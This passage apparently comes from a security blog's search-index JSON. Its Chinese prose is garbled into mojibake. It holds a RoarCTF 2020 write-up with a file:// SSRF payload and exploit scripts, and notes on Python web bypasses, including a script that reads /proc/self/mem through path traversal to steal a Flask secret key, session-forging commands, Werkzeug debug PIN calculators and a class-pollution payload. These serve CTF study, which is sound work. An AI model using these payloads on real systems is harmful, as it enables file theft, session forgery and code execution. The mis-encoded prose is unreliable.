æ–‡ä»¶å¤¹ï¼ŒåŒ…å«æ‰€æœ‰è¿˜åŸçš„DLLæ–‡ä»¶ã€‚ä½¿ç”¨dnSpyï¼ŒILSpyæˆ–è€…å…¶ä»–.Netåç¼–è¯‘å·¥å…·å³å¯æŸ¥çœ‹å…·ä½“ä¿¡æ¯ï¼Œå¯ç”¨äºæå–Unityçš„MonoBehaviourå’ŒMonoScriptï¼Œé€‚ç”¨äºUtinyRipperæˆ–è€…UABEç­‰ ida.pyç”¨äºIDA ida_with_struct.pyç”¨äºIDA, è¯»å–il2cpp.hæ–‡ä»¶å¹¶åœ¨IDAä¸­åº”ç”¨ç»“æ„ä¿¡æ¯ il2cpp.håŒ…å«ç»“æ„ä½“çš„å¤´æ–‡ä»¶ ghidra.pyç”¨äºGhidra script.jsonç”¨äºIDAå’ŒGhidraè„šæœ¬ stringliteral.jsonåŒ…å«æ‰€æœ‰stringLiteralä¿¡æ¯","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"}],"author":"Lazzaro"},{"title":"RoarCTF 2020","slug":"match-RoarCTF-2020","date":"2020-12-06T13:10:56.000Z","updated":"2020-12-12T13:36:47.734Z","comments":true,"path":"2020/12/06/match-RoarCTF-2020/","permalink":"https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/","excerpt":"","text":"â€‹ ç”±å˜¶å¼ä¸»åŠçš„2020 RoarCTFçº¿ä¸Šèµ›ï¼Œå¹³å°ï¼šhttps://ctf.4hou.com/ã€‚ Rank: 27 èµ›åæ— ç¯å¢ƒå¤ç°ï¼Œæ•…æ¯é¢˜æœªå†™ä¸Šflagå€¼ã€‚ Miscç­¾åˆ°é¢˜ä¸å±äºMiscåˆ†ç±»ä¹Ÿä¸åƒç­¾åˆ°é¢˜çš„ç­¾åˆ°é¢˜ã€‚ F12æŸ¥çœ‹æºç ï¼Œå‘ç°/?urlï¼Œéœ€è¦GETæ–¹å¼ä¼ urlã€‚ å°è¯•ç›®å½•ç©¿è¶ŠåŠè¿œç¨‹è¯·æ±‚æ•°æ®æ— æ•ˆï¼Œå‘ç°fileä¼ªåè®®/?url=file:///etc/passwdèƒ½æˆåŠŸå›æ˜¾å†…å®¹ï¼Œ è¯»index.phpæºç ï¼š/?url=file:///var/www/html/index.phpï¼Œå†…å®¹ä¸ºPHP curlå®ç°ï¼Œè¿‡æ»¤äº†flagå…³é”®å­—ã€‚ åˆ©ç”¨PHPçš„äºŒæ¬¡ç¼–ç è§£æbugï¼ˆbypass strpos verificationï¼‰ç¼–ç å³å¯ç»•è¿‡è¿‡æ»¤ï¼š Payload:/?url=file:///fla%2567 â€‹ Hi_433MHzRFå°„é¢‘ä¿¡å·æ•°æ®ï¼Œä»¥åŸå§‹æ•°æ®æ–¹å¼å¯¼å…¥AudacityæŸ¥çœ‹æ³¢å½¢ï¼Œæ”¾å¤§ï¼Œ å‘ç°æ‘©æ–¯å¯†ç ï¼Œå¯¹ç…§å¯èƒ½çš„flagå­—ç¬¦ä¸²æ‘©æ–¯å¯†ç --..--./--.--../--....-/--..---ï¼Œå¼€å¤´å››æ®µå»æ‰å‰åçš„.æ˜¯å»åˆçš„ï¼Œæ‰‹å·¥è®°å½•æ‰€æœ‰æ®µè§£å¯†å¾—flagã€‚ â€‹ FMFMè°ƒé¢‘ä¿¡å·æ•°æ®ï¼Œä»¥åŸå§‹æ•°æ®æ–¹å¼å¯¼å…¥AudacityæŸ¥çœ‹æ³¢å½¢æœªæŸ¥å‡ºæœ‰ç”¨ä¿¡æ¯ã€‚ æœç´¢å¯æŸ¥çœ‹FMä¿¡å·çš„è½¯ä»¶ï¼Œé¦–å…ˆå°è¯•ç”¨SDR#æ‰“å¼€ï¼Œè®¾å®šå¥½2MHzçš„é‡‡æ ·ç‡ï¼Œè°ƒæ•´é¢‘ç‡è‡³å¹…å€¼æœ€é«˜å¤„ï¼Œèƒ½å‹‰å¼ºå¬åˆ°äººå£°ï¼Œä½†å™ªå£°å¤ªå¤§ï¼Œå®˜æ–¹åŸç”Ÿç‰ˆSDR#ä¹Ÿæœªæ‰¾åˆ°æ¯”è¾ƒå¥½çš„å»å™ªæ»¤æ³¢åŠŸèƒ½ã€‚ æ¢ä¸€ä¸ªè½¯ä»¶ï¼Œæ‰¾åˆ°Windowså¹³å°SDRè½¯ä»¶å…¨å®¶æ¡¶PothosSDRï¼Œä½¿ç”¨é‡Œé¢çš„GQRX SDRåˆ†æï¼ŒåŠŸèƒ½é½å…¨ï¼Œå¯¼å…¥åè°ƒæ•´ Mode=Narrow FM åŠ Filter width=Wideï¼Œå¯ä»¥æ¸…æ™°å¬å‡ºå†…å®¹ï¼ŒæŠ¥çš„å°±æ˜¯flagã€‚ â€‹ CryptoCrypto_Systemä»CyBRICS 2020 - Too Secureé­”æ”¹çš„PedersenåŠ å¯†ï¼Œç®—æ³•æè¿°ï¼š å·²çŸ¥ä¿¡æ¯ $m_1,m_2$å’Œ $m_1$ çš„ $r_1$ï¼Œ$m_1$ é€šè¿‡å› å­ $r_1$ åŠ å¯†å¾—åˆ° $c_1$ï¼Œéœ€è¦æ±‚å‡ºå› å­ $r_2$ï¼Œä½¿å¾— $m_2$ é€šè¿‡ $r_2$ åŠ å¯†å¾—åˆ°çš„ $c_2$ ä¸ $c_1$ ç›¸åŒï¼Œå³äº§ç”Ÿç¢°æ’ã€‚ å¯¹äºå¾…åŠ å¯†ä¿¡æ¯ $m_1$ï¼Œ$c_1=g^{m_1}h_1^{r_1}$ï¼Œæ³¨æ„åˆ° $h_1=g^{a_1}$ï¼Œæ•… $c_1=g^{m_1+a_1r_1}$ï¼› è¦ç¢°æ’ä¿¡æ¯ $m_2$ çš„å› å­ $r_2$ åº”æ»¡è¶³ $c_2=c_1$ï¼Œå³ $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod {\\varphi(p)}$ï¼Œ åˆ $q$ ä¸º $g$ çš„é˜¶ï¼Œæ‰€ä»¥æœ‰ $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod q$ï¼Œ æ•… $r_2 \\equiv (m_1+a_1r_1-m_2) \\pmod q$ï¼Œå³å¯æ±‚å‡º $r_2$ã€‚ Expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#python2from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256from Crypto.Util.number import *import hashlibfrom gmpy2 import gcd,invertdef brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725def int2str(data, mode=&quot;big&quot;): if mode == &quot;little&quot;: return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))]) elif mode == &quot;big&quot;: return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))])def get_parameter(m): x = int2str(m, &#x27;little&#x27;) y = pow(g, x, p) a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, &quot;\\0&quot;)).digest()) b = pow(a, a, p - 1) h = pow(g, b, p) return x, y, h, bdef sign(m, r): x, y, h, b = get_parameter(m) s = (y * pow(h, r, p)) % p return sdef verify(m, r, s): x, y, h, b = get_parameter(m) if s == ((y * pow(h, r, p)) % p): return True else: return Falser=remote(&#x27;139.129.98.9&#x27;,30001)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvline()r.recvline()m1 = long_to_bytes(int(parse(&quot;Here is the frist message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))m2 = long_to_bytes(int(parse(&quot;Here is the second message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))r1 = int(parse(&quot;The frist message&#x27;s &#x27;r&#x27;:&#123;&#125;&quot;,r.recvline())[0])print(m1)print(m2)#sage solve order q: g^q=1(mod p) q = 1039300813886545966418005631983853921163721828798787466771912919828750891assert(pow(g, q, p) == 1)assert(gcd(q, p-1) == q)M1,y1,h1,b1 = get_parameter(m1)M2,y2,h2,b2 = get_parameter(m2)s1 = sign(m1, r1)p1 = b1*r1p2 = M2-M1p3 = p1-p2p4 = invert(b2,q)r2 = (p3*p4)%qs2 = sign(m2,r2)if s1==s2: print(&#x27;r1 = &#x27;+str(r1)) print(&#x27;r2 = &#x27;+str(r2)) print(&#x27;s1 = &#x27;+str(s1)) print(&#x27;s2 = &#x27;+str(s2)) print(&#x27;verify(m2,r2,s2) = &#x27;+str(verify(m2,r2,s2)))r.recvuntil(&#x27;Please choice your options:&#x27;)r.sendline(&#x27;3&#x27;)r.sendlineafter(&#x27;Please give me the (r,s) of the second message:&#x27;,&#x27;(&#x27;+str(r2)+&#x27;,&#x27;+str(s2)+&#x27;)&#x27;)print(r.recvall()) â€‹ Reverse task.py 12345678910111213141516171819202122232425from Crypto.Util.number import *from gmpy2 import *from secret import *assert(flag.decode().startswith(&#x27;flag&#123;&#x27;)) and (flag.decode().endswith(&#x27;&#125;&#x27;))def reverse(x): y = 0 while x != 0: y = y*2 + x%2 x = x // 2 return ywhile True: p = getStrongPrime(512) q = reverse(p) if is_prime(q): breakn = p*qe = 65537m = bytes_to_long(flag)enc = powmod(m,e,n)#n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889#enc = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745 ASIS 2015 - RSASRé­”æ”¹ï¼Œ $q$ æ˜¯ $p$ çš„2è¿›åˆ¶åç´ æ•°ï¼ˆemirpæ•°ï¼‰ï¼Œbin(q)=bin(p)[::-1]ã€‚ åˆ©ç”¨å›æº¯ç®—æ³•æŒ‰ä½ä»æœ€é«˜ä½ç«¯å‘ä¸­é—´çˆ†ç ´ã€‚ Expï¼š 123456789101112131415161718192021222324252627282930313233#python2n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889def t(a, b, k): # sqrt(n)æœ‰512ä½2è¿›åˆ¶ä½, éœ€è®¡ç®—é«˜ä½ä½æ¯è¾¹çš„256ä½ if k == 256: if a*b == n: print(a, b) return for i in xrange(2): for j in xrange(2): # å¯¹ä¸¤ä¸ªç´ æ•°å› å­å°è¯•çˆ†ç ´æœªéå†çš„ä½çˆ†ç ´ a1 = a + i*(2**k) + j*(2**(511-k)) b1 = b + j*(2**k) + i*(2**(511-k)) if a1*b1 &gt; n: # å½“a1å’Œb1è¿‡å¤§ continue if (a1+(2**(511-k)))*(b1+(2**(511-k))) &lt; n: # å½“a1å’Œb1è¿‡å° continue if ((a1*b1)%(2**(k+1))) != (n%(2**(k+1))): # å½“a1*b1çš„æœ€åk+1ä½ï¼ˆä¸å˜ï¼‰ä¸nçš„æœ€åk+1ä½ä¸åŒ continue # æ»¡è¶³æ¡ä»¶çš„(a1,b1)å€¼ï¼Œå°è¯•ç»§ç»­éå† t(a1, b1, k+1)# ä¸¤ä¸ªç´ æ•°å› å­æœ‰512ä½2è¿›åˆ¶ä½, å°è¯•å¯èƒ½çš„æ‰€æœ‰ä¸­é—´ä½for i in xrange(2): t(i*(2**256), i*(2**256), 0) #output:#(13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L, 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L)#(11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L, 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L) æ±‚å‡º $p,q$ å€¼ï¼ŒæŒ‰ç…§RSAè®¡ç®—æ–¹æ³•æ±‚å‡º $m$ å³ä¸ºflagã€‚ 1234567891011import gmpy2p = 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943q = 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423n = p*qfn = (p-1)*(q-1)e = 65537c = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745d = gmpy2.invert(e,fn)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))#flag","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"pythonç»•è¿‡","slug":"web-pythonç»•è¿‡","date":"2020-11-14T14:53:02.000Z","updated":"2023-10-21T10:42:49.016Z","comments":true,"path":"2020/11/14/web-pythonç»•è¿‡/","permalink":"https://lazzzaro.github.io/2020/11/14/web-python%E7%BB%95%E8%BF%87/","excerpt":"","text":"â€‹ ç»•è¿‡å¸¸è§ç»•è¿‡os.path.join()å¦‚æœä¸€ä¸ªå‚æ•°æ˜¯ä»¥/ç¬¦å·å¼€å¤´çš„ï¼Œå°±å°†è¿™ä¸ªå‚æ•°ä½œä¸ºå¼€å¤´ç»§ç»­å‘åæ‹¼æ¥ã€‚ os.path.join(&#39;uploads/&#39;, &#39;/flag&#39;) =&gt; &#39;/flag&#39; render_template()æ¨¡æ¿æ¸²æŸ“ï¼Œç¼“å­˜æœºåˆ¶ï¼šé¦–å…ˆä¼šæ£€æŸ¥æ˜¯å¦æœ‰ç¼“å­˜ï¼Œå¦‚æœç¼“å­˜å¯ç”¨å°±ä½¿ç”¨ç¼“å­˜ï¼Œç¼“å­˜ä¸å¯ç”¨å°±åŠ è½½æ¨¡æ¿ã€‚ Cache_size é»˜è®¤æ˜¯ 400ï¼Œä½¿ç”¨ LRUCacheï¼Œé»˜è®¤å°†æœ€å¸¸ç”¨çš„é¡µé¢ç¼“å­˜èµ·æ¥ï¼Œä¾¿äºä¹‹åçš„ä½¿ç”¨ï¼Œæ¯æ¬¡è®¿é—®é¡µé¢éƒ½ä¼šå°†è¿™ä¸ªé¡µé¢æ”¾åˆ°cacheçš„æœ€å‰æ–¹ï¼ŒåŒæ—¶ï¼Œå¤„äºcacheåæ–¹çš„é¡µé¢ï¼Œç”±äºé•¿æœŸå¾—ä¸åˆ°è®¿é—®ï¼Œåœ¨è¶…è¿‡cacheè§„å®šçš„æœ€å¤§é™åˆ¶ä¹‹åï¼Œå°†ä¼šè¢«ç§»é™¤å‡ºç¼“å­˜ä¸­ã€‚ â€‹ SSTIè§SSTIã€‚ â€‹ sessionä¼ªé€ åœ¨Flaskä¸­ï¼Œsessionæ˜¯ä¿å­˜åœ¨Cookieä¸­ï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¯»å–å…¶å†…å®¹ï¼Œä¹Ÿå°±äº§ç”Ÿäº†Flaskä¼ªé€ sessionçš„æ¼æ´ã€‚ secret keypythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Šã€‚ appæ˜¯å®ä¾‹åŒ–çš„Flaskå¯¹è±¡ï¼Œè€Œsecret keyåœ¨ app.config[&#39;SECRET_KEY&#39;]ï¼Œå¯ä»¥é€šè¿‡è¯»å– /proc/self/mem æ¥è¯»å–secret keyã€‚ è¯»å–å †æ ˆåˆ†å¸ƒç”±äº /proc/self/mem å†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥å…ˆè¯»å– /proc/self/maps è·å–å †æ ˆåˆ†å¸ƒã€‚ 12345678map_list = requests.get(url + f&quot;info?file=&#123;bypass&#125;/proc/self/maps&quot;)map_list = map_list.text.split(&quot;\\\\n&quot;)for i in map_list: map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end) è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®ç„¶åè¯»å– /proc/self/memï¼Œè¯»å–å¯¹åº”ä½ç½®çš„å†…å­˜æ•°æ®ï¼Œå†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾å†…å®¹ã€‚ 12345res = requests.get(f&quot;&#123;url&#125;/info?file=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;)if &quot;*abcdefgh&quot; in res.text: secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\\*abcdefgh&quot;, res.text) if secret_key: print(&quot;Secret Key:&quot;, secret_key[0]) å®Œæ•´åˆ©ç”¨123456789101112131415161718192021222324252627import requestsimport reurl = &#x27;http://url:10001&#x27;bypass = &#x27;../../../../../../../../../..&#x27;rw = []map_list = requests.get(f&quot;&#123;url&#125;/read?filename=&#123;bypass&#125;/proc/self/maps&quot;)map_list = map_list.text.split(&quot;\\n&quot;)for i in map_list: map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end) rw.append((start,end))for k in rw: res = requests.get(f&quot;&#123;url&#125;/read?filename=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;k[0]&#125;&amp;end=&#123;k[1]&#125;&quot;) if &quot;SECRET&quot; in res.text: try: secret_key = re.findall(&quot;[A-Za-z0-9+/=]&#123;40&#125;SECRET&quot;, res.text) if secret_key: print(secret_key[0]) except: pass å·¥å…·flask-unsign åŠ å¯†ï¼š flask-unsign --sign --cookie &quot;&lt;Session CookieValue&gt;&quot; --secret &#39;&lt;Secretkey&gt;&#39; è§£å¯†ï¼š flask-unsign --decode --cookie &#39;&lt;SessionCookieStructure&gt;&#39; çˆ†ç ´keyï¼š flask-unsign --unsign --cookie &#39;&lt;SessionCookieStructure&gt;&#39; flask-session-cookie-manager åŠ å¯†ï¼š flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;SecretKey&gt; -t &lt;SessionCookieStructure&gt; è§£å¯†ï¼š flask_session_cookie_manager.py decode [-h] [-s &lt;Secretkey&gt;] -c &lt;Session CookieValue&gt; è§£å¯†è„šæœ¬1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1) decompress = False if payload.startswith(b&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1].encode())) å‚è€ƒ å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜ â€‹ Flask debug PINPINç æ˜¯Flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼ã€‚ è®¡ç®—é€»è¾‘ä½äº python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_nameï¼Œç‰ˆæœ¬ä¸åŒçš„åŒºåˆ«åœ¨äº3.6ä¸3.8çš„md5åŠ å¯†å’Œsha1åŠ å¯†ä¸åŒã€‚ PINç”Ÿæˆè¦ç´ ï¼š username ç”¨æˆ·åã€‚é€šè¿‡ getpass.getuser() è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶è¯»å– /etc/passwdã€‚ modname æ¨¡å—åã€‚é€šè¿‡ getattr(mod,&quot;file&quot;,None) è¯»å–ï¼Œé»˜è®¤å€¼ä¸º flask.appã€‚ appname åº”ç”¨åã€‚é€šè¿‡ getattr(app,&quot;name&quot;,type(app).name) è¯»å–ï¼Œé»˜è®¤å€¼ä¸º Flaskã€‚ moddir Flaskåº“ä¸‹ app.py çš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡ getattr(mod,&quot;file&quot;,None) è¯»å–ï¼Œå®é™…åº”ç”¨ä¸­é€šè¿‡æŠ¥é”™è¯»å–ã€‚ uuidnode å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡ uuid.getnode() è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶ /sys/class/net/eth0/address å¾—åˆ°16è¿›åˆ¶ç»“æœï¼Œè½¬åŒ–ä¸º10è¿›åˆ¶è¿›è¡Œè®¡ç®—ã€‚ machine_id dockeræœºå™¨idã€‚æ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨ /etc/machine-id æˆ– /proc/sys/kernel/random/boot_idï¼Œdockeré¶æœºåˆ™è¯»å– /proc/self/cgroup æˆ– /proc/self/mountinfoï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„ /docker/ å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„idï¼Œåœ¨dockerç¯å¢ƒä¸‹è¯»å–åä¸¤ä¸ªï¼Œédockerç¯å¢ƒä¸‰ä¸ªéƒ½éœ€è¦è¯»å–ã€‚ é¦–å…ˆè®¿é—®/etc/machine-idï¼Œæœ‰å€¼å°±breakï¼Œæ²¡å€¼å°±è®¿é—®/proc/sys/kernel/random/boot_idï¼Œç„¶åä¸ç®¡æ­¤æ—¶æœ‰æ²¡æœ‰å€¼ï¼Œå†è®¿é—®/proc/self/cgroupå…¶ä¸­çš„å€¼æ‹¼æ¥åˆ°å‰é¢çš„å€¼åé¢ã€‚ PINç”Ÿæˆè„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142# &lt;3.8 MD5import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;# username, /etc/passwd &#x27;flask.app&#x27;,# modname, é»˜è®¤å€¼ &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)), é»˜è®¤å€¼ &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None), baox]private_bits = [ str(int(&#x27;02:42:ac:1e:00:02&#x27;.replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# str(uuid.getnode()), /sys/class/net/eth0/address, /sys/class/net/ens33/address &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 123456789101112131415161718192021222324252627282930313233343536373839404142434445# &gt;=3.8 sha1import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;root&#x27;# /etc/passwd &#x27;flask.app&#x27;,# é»˜è®¤å€¼ &#x27;Flask&#x27;,# é»˜è®¤å€¼ &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # æŠ¥é”™å¾—åˆ°]private_bits = [ str(int(&#x27;02:42:ac:1e:00:02&#x27;.replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# str(uuid.getnode()), /sys/class/net/eth0/address, /sys/class/net/ens33/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup &#x27;5dcbb59326564e8ea4e99a0afb803c47&#x27;+ # /etc/machine-id &#x27;5dcbb593-2656-4e8e-a4e9-9a0afb803c47&#x27;+ # /proc/sys/kernel/random/boot_id &#x27;0::/&#x27;.strip().rpartition(&quot;/&quot;)[2] # /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) å‚è€ƒï¼š ctfshow - web 801 GYCTF 2020 - FlaskApp *CTF - oh-my-notepro â€‹ åŸå‹é“¾æ±¡æŸ“å°±åƒJavascriptä¸­çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥åœ¨Pythonä¸­å®ç°å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºPythonä¸­çš„å®‰å…¨è®¾å®šå’Œéƒ¨åˆ†ç‰¹æ®Šå±æ€§ç±»å‹é™å®šï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»å…¶æ‰€æœ‰çš„å±æ€§éƒ½æ˜¯å¯ä»¥è¢«æ±¡æŸ“çš„ï¼Œä¸è¿‡å¯ä»¥è‚¯å®šçš„ï¼Œæ±¡æŸ“åªå¯¹ç±»çš„å±æ€§èµ·ä½œç”¨ï¼Œå¯¹äºç±»æ–¹æ³•æ˜¯æ— æ•ˆçš„ã€‚ ç¤ºä¾‹ï¼š&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;/proc/self/cgroup&quot;&#125;&#125;&#125; å‚è€ƒï¼š PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) 2023DASCTF&amp;0X401ä¸ƒæœˆèµ› - EzFlask â€‹ å…¶ä»–tarfileæ¨¡å—CVE-2007-4559 è¯¥æ¼æ´å½±å“åˆ°Pythonçš„tarfileæ¨¡å—ï¼Œå¯é€ æˆç³»ç»Ÿæ–‡ä»¶çš„ä»»æ„è¯»å–å’Œå†™å…¥ã€‚CVE-2007-4559çš„åŸºæœ¬åŸç†ä¸CVE-2001-1267ç±»ä¼¼ï¼Œå½“ä½¿ç”¨taræ‰“åŒ…ä¸€ä¸ªåŒ…å« ../../../../../etc/passwdï¼Œå¹¶ç”¨ç®¡ç†å‘˜æƒé™è§£åŒ…æ—¶ï¼Œ/etc/passwd æ–‡ä»¶ä¼šè¢«è¦†ç›–ï¼ŒåŒç†ä½¿ç”¨æ–‡ä»¶é“¾æ¥ä¹Ÿå¯ä»¥äº§ç”ŸåŒæ ·çš„æ•ˆæœã€‚","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Javaç»•è¿‡","slug":"web-Javaç»•è¿‡","date":"2020-11-14T14:29:44.000Z","updated":"2023-10-25T18:26:33.850Z","comments":true,"path":"2020/11/14/web-Javaç»•è¿‡/","permalink":"https://lazzzaro.github.io/2020/11/14/web-Java%E7%BB%95%E8%BF%87/","excerpt":"","text":"â€‹ å¸¸ç”¨æ–‡ä»¶ç»“æ„Tomcat WEB-INF æ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡ web.xml 